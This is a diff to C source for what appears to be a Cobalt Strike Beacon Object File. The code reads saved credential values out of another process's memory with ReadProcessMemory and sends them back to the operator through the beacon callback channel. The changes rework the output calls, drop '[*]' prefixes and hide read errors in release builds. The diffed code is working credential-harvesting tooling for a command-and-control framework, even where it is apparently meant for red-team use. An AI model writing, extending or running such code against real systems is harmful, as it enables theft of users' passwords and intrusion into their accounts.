@@ -155,7 +155,7 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read credential values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
         ProcessNodeValue(hProcess, node.valueAddress, buffer);
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(buffer, bufsize));
+        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);
 
         // Process the left child if it exists
         if (node.left != 0) {
@@ -191,11 +191,11 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "Size of the credential map: %zu\n", credentialMap.size);
 #endif // _DEBUG
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available credentials: %zu\n\n", credentialMap.size);
+        BeaconPrintf(CALLBACK_OUTPUT, "Number of available credentials: %zu\n\n", credentialMap.size);
 
         if (credentialMap.firstNode == 0) //CookieMap was empty
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] This credential map was empty\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "This credential map was empty\n");
             return;
         }
 
@@ -264,8 +264,10 @@ extern "C" {
                         }
                     }
                     else {
+#ifdef _DEBUG
                         //This happens quite a lot, will not print these errors on release build
                         BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed\n", GetLastError());
+#endif
                     }
 
                     free(buffer);
@@ -301,8 +303,10 @@ extern "C" {
             }
         }
         else {
+#ifdef  _DEBUG
             //This happens quite a lot, will not print these errors on release build
             BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed\n", GetLastError());
+#endif
         }
 
         free(buffer);
